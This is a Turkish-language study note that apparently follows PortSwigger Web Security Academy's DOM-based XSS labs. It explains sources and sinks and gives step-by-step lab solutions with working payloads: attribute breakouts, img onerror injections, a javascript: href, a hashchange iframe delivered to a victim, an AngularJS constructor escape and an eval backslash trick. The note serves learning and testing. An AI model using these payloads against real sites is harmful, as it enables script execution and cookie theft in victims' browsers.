Unutmayın: Tarayıcının “View source” (kaynağı görüntüle) seçeneği **DOM XSS** testlerinde işe yaramaz çünkü bu yöntem, JavaScript tarafından HTML üzerinde yapılan değişiklikleri göstermez. Google Chrome’un devtools araçlarında `Ctrl+F` (veya macOS için `Cmd+F`) ile **DOM** içinde string’inizi arayabilirsiniz.

String’iniz DOM’da nerede görünüyorsa, her bir konum için ilgili **context**'i  belirlemeniz gerekir. Bu bağlama göre input’unuzu hassaslaştırmalı ve nasıl işlendiğini gözlemlemelisiniz. Örneğin, string’iniz çift tırnaklı bir **HTML attribute** (nitelik) içinde yer alıyorsa, input’unuza çift tırnak karakterleri (`"`) ekleyerek bu attribute dışına çıkmayı deneyin.

Dikkat edilmesi gereken bir diğer konu da tarayıcıların **URL encoding** davranışlarının farklı olmasıdır: Chrome, Firefox ve Safari gibi modern tarayıcılar `location.search` ve `location.hash` değerlerini otomatik olarak **URL-encode** eder. Ancak IE11 ve eski Microsoft Edge (Chromium öncesi sürümler), bu kaynakları **encode** etmez.

Eğer veriniz tarayıcı tarafından **URL-encoded** edilerek işleniyorsa, bu durumda potansiyel bir **XSS payload**'u çalıştırmak genellikle mümkün olmaz. Bu nedenle, **source**’tan gelen verinin **sink**'e nasıl taşındığını ve bu süreçte herhangi bir filtreleme, encode veya decode işlemi uygulanıp uygulanmadığını dikkatlice analiz etmek gerekir.

### Testing JavaScript execution sinks

**DOM tabanlı XSS** için **JavaScript execution sink**'lerini test etmek biraz daha zordur. Bu tür **sink**'lerde, girdiğiniz veri genellikle **DOM** içinde görünmez, bu nedenle onu arayıp bulamazsınız. Bunun yerine, girdinizin bir **sink**'e gönderilip gönderilmediğini ve nasıl gönderildiğini anlamak için **JavaScript debugger** kullanmanız gerekir.

Her bir potansiyel **source** (örneğin `location`) için, sayfadaki **JavaScript** kodlarında bu **source**’un nerelerde referans alındığını bulmanız gerekir. Chrome geliştirici araçlarında `Ctrl+Shift+F` (veya macOS için `Cmd+Alt+F`) tuş kombinasyonuyla sayfadaki tüm JavaScript kodları içinde **source**’u arayabilirsiniz.

**Source**'un nerede okunduğunu bulduğunuzda, **JavaScript debugger** ile oraya bir **breakpoint** (durdurma noktası) ekleyerek **source**’un değerinin nasıl kullanıldığını adım adım izleyebilirsiniz. Genellikle **source**’tan alınan veri başka değişkenlere atanır. Bu durumda, bu yeni değişkenleri de aynı şekilde arayıp izlemeli ve bir **sink**’e aktarılıp aktarılmadıklarını kontrol etmelisiniz. Eğer **source**’tan türeyen bir verinin bir **sink**’e gönderildiğini tespit ederseniz, debugger üzerinden bu veriyi **sink**'e aktarılmadan önce fareyle üzerine gelerek (hover) kontrol edebilirsiniz.

Bu noktadan sonra, tıpkı **HTML sink**’lerinde olduğu gibi, **input**’unuzu detaylandırmanız ve uygun bir **XSS payload**'u yerleştirerek başarılı bir saldırının mümkün olup olmadığını test etmeniz gerekir.


### DOM Invader kullanarak DOM XSS testi

Gerçek dünyada **DOM tabanlı XSS** zafiyetlerini tespit etmek ve sömürmek zahmetli bir süreç olabilir; genellikle karmaşık ve **minify** edilmiş **JavaScript** kodları arasında elle gezinmeyi gerektirir. Ancak **Burp Suite**'in tarayıcısını kullanırsanız, içerisinde yer alan **DOM Invader** extension'ından faydalanabilirsiniz. Bu extension, sizin yerinize birçok karmaşık işlemi otomatik olarak gerçekleştirerek süreci oldukça kolaylaştırır.


### DOM XSS'i farklı source ve sink'lerle exploit etme

Teorik olarak, bir web sitesi, bir **source** (kaynak) üzerinden bir **sink**’e (hedefe) veri aktarımının gerçekleştiği çalıştırılabilir bir yol varsa **DOM tabanlı cross-site scripting (XSS)** zafiyetine karşı savunmasızdır. Ancak pratikte, farklı **source** ve **sink** türleri, sömürülebilirliği etkileyebilecek çeşitli özelliklere ve davranışlara sahiptir ve hangi tekniklerin kullanılması gerektiğini belirler. Ayrıca, web sitesindeki **script**'ler, zafiyeti sömürmeye çalışırken dikkate alınması gereken doğrulama veya başka veri işleme işlemleri gerçekleştirebilir.

**DOM tabanlı zafiyetlerle** ilişkili olan çeşitli **sink** türleri mevcuttur. Detaylar için aşağıdaki listeye başvurabilirsiniz.

Örneğin, `document.write` sink’i **script** elementleriyle çalıştığı için aşağıdaki gibi basit bir **payload** kullanılabilir:

```
document.write('... <script>alert(document.domain)</script> ...');
```

---

# Lab: DOM XSS in `document.write` sink using source `location.search`

Bu laboratuvar, search query tracking fonksiyonunda DOM based cross-site scripting güvenlik açığı içermektedir. Sayfaya veri yazan JavaScript `document.write` fonksiyonunu kullanır. `document.write` fonksiyonu, web sitesi URL'sini kullanarak kontrol edebileceğiniz `location.search`'ten gelen verilerle çağrılır.

Bu laboratuvarı çözmek için `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

Çözüm : 

1- Search kutusuna rastgele bir alphanumeric string girin.

2- Öğeye sağ tıklayıp inceleyin ve rastgele stringinizin bir `img src` attribute içine yerleştirildiğini gözlemleyin.

![Pasted image 20250410232040.png](/img/user/resimler/Pasted%20image%2020250410232040.png)

![Pasted image 20250410232118.png](/img/user/resimler/Pasted%20image%2020250410232118.png)

3- Şunu arayarak `img` attribute'undan çıkın:

```
"><svg onload=alert(1)>
```

![Pasted image 20250410232135.png](/img/user/resimler/Pasted%20image%2020250410232135.png)

![Pasted image 20250410232207.png](/img/user/resimler/Pasted%20image%2020250410232207.png)

---

Ancak şunu unutmamak gerekir ki, bazı durumlarda `document.write` ile yazılan içerik, etrafında yer alan **context** ile birlikte gelir ve bu context, hazırladığınız **exploit**’te dikkate alınmalıdır.  

Örneğin, mevcut bazı HTML elementlerini kapatmanız gerekebilir; ancak bu şekilde JavaScript **payload**’unuzu düzgün şekilde yerleştirip çalıştırabilirsiniz.


-----

# Lab: `document.write` sink’inde, `location.search` **source**’unu kullanarak, bir `select` elementi içinde DOM tabanlı XSS gerçekleştirme.

Bu laboratuvar, **stock checker** fonksiyonunda DOM tabanlı bir **cross-site scripting (XSS)** zafiyeti içermektedir. Sayfaya veri yazmak için JavaScript'in `document.write` fonksiyonu kullanılmaktadır. Bu fonksiyon, kontrol edebileceğiniz `location.search` üzerinden gelen veriyi sayfaya yazmaktadır. Yazılan veri, bir `select` elementi içinde yer almaktadır.

Bu laboratuvarı çözmek için, `select` elementinden çıkmayı başaran ve `alert` fonksiyonunu çağıran bir **cross-site scripting** saldırısı gerçekleştirmeniz gerekmektedir.

Çözüm : 

1- Product sayfalarında, tehlikeli JavaScript kodunun `location.search` soruce'undan bir `storeId` parametresi çıkardığına dikkat edin. Daha sonra bu parametreyi kullanarak, **stock checker** fonksiyonuna ait `select` elementi içinde yeni bir `option` oluşturmak için `document.write` fonksiyonunu kullanır.

![Pasted image 20250410233932.png](/img/user/resimler/Pasted%20image%2020250410233932.png)

![Pasted image 20250410234053.png](/img/user/resimler/Pasted%20image%2020250410234053.png)

2- URL'ye bir `storeId` query parametresi ekleyin ve değer olarak rastgele bir alphanumeric string girin. Bu değiştirilmiş URL'yi isteyin.

![Pasted image 20250411021642.png](/img/user/resimler/Pasted%20image%2020250411021642.png)

3- Browser'da, random string'inizin artık açılır listedeki seçeneklerden biri olarak listelendiğine dikkat edin.

4- Sağ tıklayıp açılır listeyi inceleyerek, `storeId` parametrenizin değerinin bir `select` elementi içine yerleştirildiğini doğrulayın.

![Pasted image 20250411021840.png](/img/user/resimler/Pasted%20image%2020250411021840.png)

**Veri Tanımlama**:  
`stores` adlı bir dizi tanımlanır, bu dizi içinde 3 mağaza ismi ("London", "Paris", "Milan") bulunur.

**URL Parametresini Alma**:  
Sayfanın URL'sindeki `storeId` parametresi `URLSearchParams` kullanılarak alınır. Bu parametre, örneğin `?storeId=Paris` şeklinde olabilir.

**HTML Select Elemanı Oluşturma**:  
`document.write('<select name="storeId">');` ile bir `<select>` (açılır menü) elemanı oluşturulur.

**Seçilen Mağazayı Gösterme**:  
Eğer `storeId` parametresi URL'de varsa (yani bir mağaza seçilmişse), bu mağaza adı `selected` olarak işaretlenir ve açılır menüde seçili olarak görünür.

**Diğer Mağazaları Listeleme**:  
Sonrasında, `stores` dizisindeki her mağaza için bir `<option>` elemanı oluşturulur. Eğer mağaza adı `store` parametresiyle aynıysa, o mağaza zaten seçili olduğu için atlanır (`continue` komutu ile).

**Sonuç**:  
Bu kodun sonunda, kullanıcıya şu anki mağaza seçimi varsa bu seçili olarak gösterilir, diğer mağazalar ise seçenek olarak sunulur.


5- URL'yi `storeId` parametresinin içine uygun bir XSS payloadu içerecek şekilde aşağıdaki gibi değiştirin:

```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

---

`innerHTML` sink hiçbir modern tarayıcıda `script` elementlerini kabul etmez ve `svg` `onload` event'lerini çalıştırmaz. Bu, `img` veya `iframe` gibi alternatif elementler kullanmanız gerektiği anlamına gelir. Bu elementlerle birlikte `onload` ve `onerror` gibi event handler'lar kullanılabilir. Örneğin:

```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

---

# Laboratuvar: Source location.search kullanarak innerHTML sink içinde DOM XSS

Bu laboratuvar, search blog fonksiyonunda DOM-based cross-site scripting güvenlik açığı içermektedir. Bir `div` elementinin HTML içeriğini `location.search`'ten gelen verileri kullanarak değiştiren bir `innerHTML` assignment'ı (atama) kullanır.

Bu laboratuvarı çözmek için `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

Çözüm : 

![Pasted image 20250419215606.png](/img/user/resimler/Pasted%20image%2020250419215606.png)

1- Search Box içine aşağıdakileri girin:

```
<img src=1 onerror=alert(1)>
```

2- Click "Search".

`src` attribute değeri geçersizdir ve bir hata verir. Bu, `onerror` event handler'ını tetikler ve ardından `alert()` fonksiyonunu çağırır. Sonuç olarak, kullanıcının tarayıcısı kötü amaçlı gönderinizi içeren sayfayı yüklemeye çalıştığında payload çalıştırılır.

![Pasted image 20250419215927.png](/img/user/resimler/Pasted%20image%2020250419215927.png)

---

# Third-party dependencies içindeki source ve sink'ler

Modern web uygulamaları genellikle geliştiriciler için ek fonksiyonlar ve yetenekler sağlayan bir dizi third-party kütüphaneler ve frameworkler kullanılarak oluşturulur. Bunlardan bazılarının aynı zamanda DOM XSS için potansiyel sources ve sink olduğunu unutmamak önemlidir.

#### DOM XSS in jQuery

jQuery gibi bir JavaScript kütüphanesi kullanılıyorsa, sayfadaki DOM elementlerini değiştirebilecek sink'lere dikkat edin. Örneğin, jQuery'nin `attr()` fonksiyonu DOM elementlerin attribute'larını değiştirebilir. URL gibi kullanıcı tarafından kontrol edilen bir source'tan veri okunup `attr()` fonksiyonuna aktarılırsa, XSS'ye neden olmak için gönderilen değeri manipüle etmek mümkün olabilir. Örneğin, burada URL'den veri kullanarak bir `anchor` elementinin `href` attribute'unu değiştiren bazı JavaScript'lerimiz var:

```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

URL'yi, `location.search` source'u kötü amaçlı bir JavaScript URL'si içerecek şekilde değiştirerek bu durumdan faydalanabilirsiniz. Sayfanın JavaScript'i bu kötü amaçlı URL'yi back link'in `href`'ine uyguladıktan sonra back link'e tıklandığında URL çalıştırılacaktır:

```
?returnUrl=javascript:alert(document.domain)
```


----

# Laboratuvar: `location.search` source kullanarak jQuery anchor `href` attribute sink'te DOM XSS

Bu laboratuvar, submit feedback sayfasında DOM based cross-site scripting güvenlik açığı içermektedir. Bir anchor elementi bulmak için jQuery kütüphanesinin `$` selector fonksiyonunu kullanır ve `location.search`'teki verileri kullanarak `href` attribute'unu değiştirir.

Bu laboratuvarı çözmek için “back” linkini alert `document.cookie` yapın.


Çözüm : 

![Pasted image 20250419225400.png](/img/user/resimler/Pasted%20image%2020250419225400.png)

Bu jQuery kodu, sayfa yüklendiğinde bir işlem gerçekleştirir. Adım adım ne yaptığını basitçe açıklayayım:

1. **Sayfa yüklendiğinde çalışır**: Kod, `$(function() { ... })` yapısıyla başlar. Bu, jQuery'nin sayfa tamamen yüklendiğinde (DOM hazır olduğunda) içindeki kodu çalıştıracağını belirtir.

2. **URL'deki parametreyi alır**: 
   - `window.location.search`, tarayıcının adres çubuğundaki query parametrelerini (örneğin, `?returnPath=anasayfa`) döndürür.
   - `new URLSearchParams(window.location.search)` ile bu query parametreleri bir object'e çevrilir.
   - `.get('returnPath')` ile `returnPath` adındaki parametrenin değeri alınır (örneğin, `anasayfa`).

3. **Bağlantının `href` özelliğini günceller**:
   - `$('#backLink')`, ID'si `backLink` olan HTML elementini (örneğin, bir `<a>` etiketi) seçer.
   - `.attr("href", ...)` ile bu elementin `href` özelliği, `returnPath` parametresinden gelen değere ayarlanır.

### Örnek:

- URL: `http://ornek.com?sayfa=detay&returnPath=/anasayfa`
- Kod çalıştığında:
  - `returnPath` parametresi `/anasayfa` olarak alınır.
  - `<a id="backLink">` tag'ının `href` özelliği `/anasayfa` olarak güncellenir.

### Sonuç:

Bu kod, bir "back" bağlantısının (`backLink`) yönlendireceği adresi, URL'deki `returnPath` parametresine göre dinamik olarak ayarlar. Örneğin, kullanıcıyı önceki sayfaya veya belirtilen bir yola yönlendirmek için kullanılır.

1- Feedback Submit sayfasında, `returnPath` query parametresini `/` ve ardından rastgele bir alfanümerik string olarak değiştirin.

![Pasted image 20250419224353.png](/img/user/resimler/Pasted%20image%2020250419224353.png)

![Pasted image 20250419224507.png](/img/user/resimler/Pasted%20image%2020250419224507.png)

2 - Elemente sağ tıklayıp inceleyin ve rastgele stringinizin bir a `href` attribute içine yerleştirildiğini gözlemleyin.

![Pasted image 20250419225157.png](/img/user/resimler/Pasted%20image%2020250419225157.png)


3- `returnPath` olarak değiştirin:

```
javascript:alert(document.cookie)
```

![Pasted image 20250419230801.png](/img/user/resimler/Pasted%20image%2020250419230801.png)

Enter tuşuna basın ve “`back`” e tıklayın.

![Pasted image 20250419231123.png](/img/user/resimler/Pasted%20image%2020250419231123.png)

---

Dikkat edilmesi gereken bir diğer potansiyel sink ise jQuery'nin `$()` selector fonksiyonudur ve DOM'a kötü amaçlı object'ler enjekte etmek için kullanılabilir.

jQuery eskiden son derece popülerdi ve klasik bir DOM XSS güvenlik açığı, animasyonlar veya sayfadaki belirli bir öğeye otomatik kaydırma için `location.hash` source ile birlikte bu seçiciyi kullanan web sitelerinden kaynaklanıyordu. Bu davranış genellikle aşağıdakine benzer şekilde savunmasız bir `hashchange` event handler kullanılarak uygulanıyordu:

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

`Hash` kullanıcı tarafından kontrol edilebilir olduğundan, bir saldırgan bunu `$()` selector sink'ine bir XSS vektörü enjekte etmek için kullanabilir. jQuery'nin daha yeni sürümleri, input bir hash karakteri (`#`) ile başladığında bir selector'a HTML enjekte etmenizi engelleyerek bu zafiyeti yamalamıştır. Bununla birlikte, vahşi doğada hala savunmasız kod bulabilirsiniz.

Bu klasik güvenlik açığından gerçekten faydalanmak için, kullanıcı etkileşimi olmadan bir `hashchange` event'i tetiklemenin bir yolunu bulmanız gerekir. Bunu yapmanın en basit yollarından biri, exploit'inizi bir `iframe` aracılığıyla sunmaktır:

```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Bu örnekte, `src` attribute'u boş bir hash değeri ile güvenlik açığı bulunan sayfayı işaret etmektedir. `İframe` yüklendiğinde, hash'e bir XSS vektörü eklenir ve `hashchange` event'inin tetiklenmesine neden olur.


### Not

jQuery'nin daha yeni sürümleri bile, # prefix'i gerektirmeyen bir kaynaktan gelen input üzerinde tam kontrole sahip olmanız koşuluyla, $() selector sink aracılığıyla hala savunmasız olabilir.

---

# Laboratuvar: Bir `hashchange` event kullanarak jQuery selector sink'te DOM XSS


1- Burp veya browser'ın DevTools'unu kullanarak home page'deki güvenlik açığı olan kodu fark edin.

![Pasted image 20250420100659.png](/img/user/resimler/Pasted%20image%2020250420100659.png)

Bu jQuery kodu, tarayıcı adres çubuğundaki **hash** (örneğin `#YaziBasligi`) değiştiğinde belirli bir blog yazısına **otomatik olarak kaydırma** (scroll) işlemi yapar.

`$(window).on('hashchange', function() { ... });`

- Tarayıcı adres çubuğunda `#etiket` (hash) kısmı değiştiğinde bu fonksiyon tetiklenir.
- Örneğin, URL `http://site.com/#YaziBasligi` olursa `hashchange` olayı meydana gelir.

`window.location.hash.slice(1)`

- `window.location.hash` → `#YaziBasligi`
- `.slice(1)` → `YaziBasligi` (başındaki `#` karakteri atılır)
- `decodeURIComponent(...)` ile de URL kodlaması çözülür (örneğin `%20` → boşluk).

`$('section.blog-list h2:contains(...)')`

- Sayfadaki `<section class="blog-list">` içinde bulunan `<h2>` başlıkları arasında, **içeriğinde** `YaziBasligi` geçen elementi arar.
- `:contains(...)` bir jQuery filtresidir; verilen metni içeren öğeyi seçer.

`post.get(0).scrollIntoView();`

* Bulunan ilk öğeyi (`h2`) alır ve `scrollIntoView()` ile sayfayı oraya kaydırır.

2- Laboratuvar banner'ından, exploit sunucusunu açın.

3- Body bölümüne aşağıdaki zararlı iframe'i ekleyin:Lab: Bir `hashchange` event'i kullanarak jQuery selector sink'te DOM XSS

```
<iframe src="https://0aaf0077048cc19480ef030400f10068.web-security-academy.net//#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

4- Exploit'i kaydedin, ardından `print()` fonksiyonunun çağrıldığını onaylamak için **View exploit**'e tıklayın.

5- Exploit sunucusuna geri dönün ve laboratuvarı çözmek için Delivery to victim seçeneğine tıklayın.

---

#### DOM XSS in AngularJS

AngularJS gibi bir framework kullanılıyorsa, JavaScript'i köşeli parantezler veya event'ler olmadan çalıştırmak mümkün olabilir. Bir site bir HTML elementi üzerinde `ng-app` özelliğini kullandığında, bu özellik AngularJS tarafından işlenecektir. Bu durumda, AngularJS JavaScript'i doğrudan HTML'de veya Attribute'ların içinde oluşabilecek çift küme parantezleri içinde çalıştıracaktır.


---

# Laboratuvar: AngularJS ifadesinde köşe parantezleri ve çift tırnaklarla DOM XSS HTML kodlu

Bu laboratuvar, search fonksiyonu içindeki bir AngularJS ifadesinde DOM based cross-site scripting güvenlik açığı içermektedir.

AngularJS, `ng-app` attribute'unu (AngularJS directive olarak da bilinir) içeren HTML node'larının içeriğini tarayan popüler bir JavaScript kütüphanesidir. HTML koduna bir directive eklendiğinde, JavaScript ifadelerini çift küme parantezleri içinde çalıştırabilirsiniz. Bu teknik, köşeli parantezler kodlanırken kullanışlıdır.

Bu laboratuvarı çözmek için, bir AngularJS ifadesini çalıştıran ve `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Search (Arama) kutusuna rastgele bir alfanümerik string girin.

![Pasted image 20250420112816.png](/img/user/resimler/Pasted%20image%2020250420112816.png)

2- Sayfa kaynağını görüntüleyin ve rastgele stringinizin bir `ng-app` direktifinin içine alındığını gözlemleyin.

* Sayfada `ng-app` direktifi `<body>` tag’ine eklenmiş. Bu, AngularJS'in uygulamayı bu alanda çalıştırdığını gösteriyor.

* AngularJS, `{{...}}` (çift süslü parantez) içine yazılan ifadeleri değerlendiriyor.

```
{{1 + 2}}  // 3 döner
```

* AngularJS’in güvenlik sınırları içinde `alert()` gibi global fonksiyonlar çalıştırılamıyor.

* Bypass Stratejisi: Function Constructor -> JavaScript’te, yeni fonksiyonlar dinamik olarak şu şekilde yaratılabilir:

```js
var f = new Function("alert(1)");
f();  // alert kutusu çıkar
```

* Bu yöntemi AngularJS içinde dolaylı olarak kullanmak için, `watch` veya `digest` gibi Angular fonksiyonları kullanılarak onların `constructor` özelliğine ulaşılır:

* `{{watch.constructor('alert(1)')()}}`

- `watch` AngularJS'in içsel bir metodudur.

- `.constructor` ile JavaScript'in Function Constructor’ına erişilir.

- Ardından oluşturulan fonksiyon `()` ile çağrılır.


3- Search kutusuna aşağıdaki AngularJS ifadesini girin:

```
{{$on.constructor('alert(1)')()}}
```

4- Click **search**

![Pasted image 20250420113307.png](/img/user/resimler/Pasted%20image%2020250420113307.png)

---

# Reflected ve stored data ile birleştirilmiş DOM XSS

Bazı saf (pure) **DOM tabanlı güvenlik açıkları**, tamamen tek bir sayfa içerisinde gerçekleşir. Eğer bir script, URL'den bazı verileri okuyup bu verileri tehlikeli bir **sink**'e (_veri yazım noktası_) yazarsa, bu güvenlik açığı tamamen **client-side** olur.

Ancak **source**'lar (_veri kaynakları_), sadece tarayıcılar tarafından doğrudan açığa çıkan verilerle sınırlı değildir – bu veriler aynı zamanda web sitesinin kendisinden de gelebilir. Örneğin, web siteleri sıklıkla URL parametrelerini, serverdan gelen HTML response'una yansıtır. Bu durum genellikle klasik **XSS (Cross-Site Scripting)** ile ilişkilendirilir, fakat aynı zamanda **reflected DOM XSS** güvenlik açıklarına da yol açabilir.

Bir **reflected DOM XSS** güvenlik açığında, sunucu request'eki veriyi işler ve bu veriyi response içerisine yansıtır. Yansıtılan veri, bir **JavaScript string literal**'ı (_sabit metin dizisi_) içine veya DOM içinde bir data elementine (örneğin bir form alanına) yerleştirilmiş olabilir. Sayfa üzerindeki bir script daha sonra bu yansıtılan veriyi güvensiz bir şekilde işler ve sonunda tehlikeli bir **sink**'e yazar.

```
eval('var data = "reflected string"');
```

---

# Lab: Reflected DOM XSS

Bu laboratuvarda reflected bir DOM güvenlik açığı gösterilmektedir. Reflected DOM güvenlik açıkları, server-side uygulaması bir request'ten gelen verileri işlediğinde ve bu verileri response'a eklediğinde ortaya çıkar. Sayfadaki bir script daha sonra reflekte edilen veriyi güvenli olmayan bir şekilde işler ve sonuçta tehlikeli bir sink'e yazar.

Bu laboratuvarı çözmek için `alert()` fonksiyonunu çağıran bir enjeksiyon oluşturun.

1- Burp Suite'te Proxy aracına gidin ve Intercept özelliğinin açık olduğundan emin olun.

2- Laboratuvara geri dönün, hedef web sitesine gidin ve “XSS” gibi rastgele bir test string'i aramak için search bar'ı kullanın.

![Pasted image 20250420120528.png](/img/user/resimler/Pasted%20image%2020250420120528.png)

3- Burp Suite'teki Proxy aracına dönün ve request'i iletin.

4- Intercept sekmesinde, stringin `search-results` adlı bir JSON response'a yansıtıldığına dikkat edin.

5- Sitemap'den `searchResults.js` dosyasını açın ve JSON response'un bir `eval()` fonksiyon çağrısı ile kullanıldığına dikkat edin.

![Pasted image 20250420120631.png](/img/user/resimler/Pasted%20image%2020250420120631.png)

![Pasted image 20250420120644.png](/img/user/resimler/Pasted%20image%2020250420120644.png)

Bu kod, belirli bir URL'ye AJAX isteği gönderip sunucudan gelen arama sonuçlarını alır ve web sayfasına dinamik olarak ekler. Başlık, görsel, özet ve "View post" butonunu gösterir. Son olarak "Back to Blog" linki ekler.

**Not:** `eval()` kullandığı için güvenlik açısından risklidir.

6- Farklı search string'lerle denemeler yaparak, JSON response'un quotation (tırnak) mark'lardan kaçtığını tespit edebilirsiniz. Ancak backslash (eğik çizgi) işaretinden kaçılmamaktadır.

7- Bu laboratuvarı çözmek için aşağıdaki search terimini girin:

```
\"-alert(1)}//
```

Sayfaya bir ters eğik çizgi (`\`) enjekte ettiğinizde ve site bunları kaçış karakteri olarak doğru şekilde işlemiyorsa, **JSON response'u**, açılış çift tırnak karakterini (`"`) kaçış karakteriyle belirtmeye çalıştığında ikinci bir ters eğik çizgi daha ekler. Ortaya çıkan **çift ters eğik çizgi (`\\`)**, aslında kaçırma işleminin etkisiz hale gelmesine neden olur. Bu da, çift tırnak karakterlerinin kaçırılmadan (`_unescaped_`) işlenmesiyle sonuçlanır ve bu karakterler arama terimini içermesi gereken string'i erken kapatır.

Ardından bir **aritmetik operatör** (bu örnekte çıkarma operatörü `-`), ifadeleri ayırmak için kullanılır ve `alert()` fonksiyonu çağrılır. Son olarak, bir kapanış süslü parantez (`}`) ve iki eğik çizgi (`//`), JSON object'ini erken kapatarak kalan kısmı yorum satırına dönüştürür.

Sonuç olarak, sunucu tarafından oluşturulan response şu şekilde olur:

```js
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```


### Özet : 

 Sayfada kullanılan JavaScript dosyası harici bir dosyada tanımlı: `search-results.js`. Bu dosyada tanımlı olan `search()` fonksiyonu çağrılıyor ve bu fonksiyon bir **path** parametresi alıyor.

İçeride `XMLHttpRequest` (XHR) nesnesi oluşturuluyor ve bu nesne aracılığıyla sunucuya **asenkron bir istek** gönderiliyor. Modern uygulamalarda bu işlem genellikle `fetch` veya `Promise` tabanlı API’lerle yapılsa da burada geleneksel `XMLHttpRequest` kullanılıyor.

#### `eval()` ile Gelen Veriyi İşleme

Cevap alındığında şu işlem yapılıyor:

```
eval("var searchResultsObj = " + this.responseText);
```

Yani sunucudan gelen `JSON` verisi, doğrudan `eval()` fonksiyonuna geçirilerek çalıştırılıyor. Bu da şu anlama geliyor: **eğer saldırgan yanıtı manipüle edebilirse, sayfa üzerinde rastgele JavaScript kodu çalıştırabilir.**

Ardından bu nesne, `displaySearchResults()` fonksiyonuna aktarılıyor ve arama sonuçları gösteriliyor.

`eval()` fonksiyonunun kullanımı doğrudan gelen JSON verisinin çalıştırılmasına neden olduğu için, sunucudan dönen yanıta bir saldırganın müdahale etmesi durumunda, **kötü amaçlı JavaScript kodu çalıştırılabilir**.

Bu özellikle DOM tabanlı XSS senaryolarında tehlikelidir çünkü bu durumda zafiyet istemci tarafında (browser üzerinde) ortaya çıkar, yani güvenlik duvarları veya sunucu tarafı filtreleri bu açığı engelleyemez.

Sunucudan dönen JSON, normalde şöyle olmalı:

```
["search result 1", "search result 2"]
```

Ama biz `search="] - alert(1) //"` gönderdiğimizde, response şu hale geliyor:

```
["search term: \"] - alert(1) //"]
```

Bu escape edilmeden `eval()` içinde çalıştırılıyor ve şöyle oluyor:

```
eval("var searchResultsObj = [\"search term: \"] - alert(1) //");
```

Dikkat et: `"\"` karakteri `\` olarak kaçırılmış ama yeterli değil! `eval` çalıştığında string kapanıyor, `- alert(1)` aritmetik bir ifade gibi yorumlanıyor ve `alert(1)` tetikleniyor.

- **`eval()`**: Güvensiz şekilde JSON’u parse etmeye çalışıyor.
    
- **Backslash (`\`) kaçar ama bir tane daha eklenince escape bozuluyor.**
    
- **Double quotes kapanıyor, kod injection’a kapı açılıyor.**
    
- **`- alert(1)`** bir JavaScript ifadesi olarak geçerli. Sonuç: XSS tetikleniyor.

---
Web siteleri ayrıca verileri sunucuda saklayabilir ve başka bir yerde yansıtabilir. Stored DOM XSS güvenlik açığında server bir request'ten veri alır, depolar ve daha sonra bu veriyi daha sonraki bir response'a dahil eder. Daha sonraki response'da yer alan bir script, daha sonra verileri güvenli olmayan bir şekilde işleyen bir sink içerir.

```
element.innerHTML = comment.author
```

---

# Lab: Stored DOM XSS

Bu laboratuvar, blog comment fonksiyonundaki stored DOM güvenlik açığını göstermektedir. Bu laboratuvarı çözmek için `alert()` fonksiyonunu çağırarak bu güvenlik açığından yararlanın.

Aşağıdaki vektörü içeren bir yorum gönderin:

```
<><img src=1 onerror=alert(1)>
```

![Pasted image 20250420123955.png](/img/user/resimler/Pasted%20image%2020250420123955.png)


XSS'i (Cross-Site Scripting) önlemek amacıyla, web sitesi `replace()` fonksiyonunu kullanarak açılı parantezleri (angle brackets) kodlamaya çalışıyor. Ancak, `replace()` fonksiyonunda ilk parametre bir string olduğunda, yalnızca ilk eşleşmeyi değiştirir. Bu zayıflığı, yorumun başına fazladan bir çift açılı parantez ekleyerek kötüye kullanabiliriz. Bu ilk parantez çifti kodlanır, ancak sonraki parantezler etkilenmeden kalır. Bu sayede filtreyi atlatıp HTML enjekte etmeyi başarabiliriz.

* Web sitesi, kullanıcı yorumlarını işlerken `replace()` fonksiyonu ile `<` ve `>` karakterlerini HTML entity'lerine (`&lt;`, `&gt;`) çevirerek XSS'i engellemeye çalışıyor.

* Ancak, `replace()` fonksiyonu string olarak kullanıldığında **yalnızca ilk eşleşmeyi** değiştiriyor.

*  Bu da, yorumun başına sahte bir `<` karakteri ekleyerek filtreyi kandırmayı sağlıyor; sonraki açılı parantezler filtrelenmiyor.

Sayfa yüklendiğinde yorumlar bir JavaScript dosyası (`loadCommentsWithVulnerableEscapeHtml.js`) aracılığıyla DOM'a ekleniyor. Yani XSS saldırısı, DOM manipülasyonu sonucu tetikleniyor.

**Kritik Nokta:** Filtreleme sunucu tarafında değil, istemci tarafında yapılıyor ve hatalı şekilde uygulanıyor.

---

## Hangi sinkler DOM-XSS güvenlik açıklarına yol açabilir?

Aşağıda, DOM-XSS güvenlik açıklarına yol açabilecek ana sink'lerden bazıları verilmiştir:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

Aşağıdaki jQuery fonksiyonları da DOM-XSS güvenlik açıklarına yol açabilecek sinklerdir:

```js
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```


### DOM-XSS güvenlik açıkları nasıl önlenir

DOM based vulnerabilities sayfasında açıklanan genel önlemlere ek olarak, güvenilmeyen herhangi bir kaynaktan gelen verilerin HTML belgesine dinamik olarak yazılmasına izin vermekten kaçınmalısınız.


# Cross-site scripting contexts

Reflected ve stored XSS için test yaparken, önemli bir görev XSS context'ini tanımlamaktır:

* Response içinde saldırgan tarafından kontrol edilebilen verilerin göründüğü konum.

* Uygulama tarafından bu veriler üzerinde gerçekleştirilen herhangi bir input doğrulaması veya diğer işlemler.

Bu ayrıntılara dayanarak, bir veya daha fazla potansiyel XSS payload'u seçebilir ve bunların etkili olup olmadığını test edebilirsiniz.

#### Not  

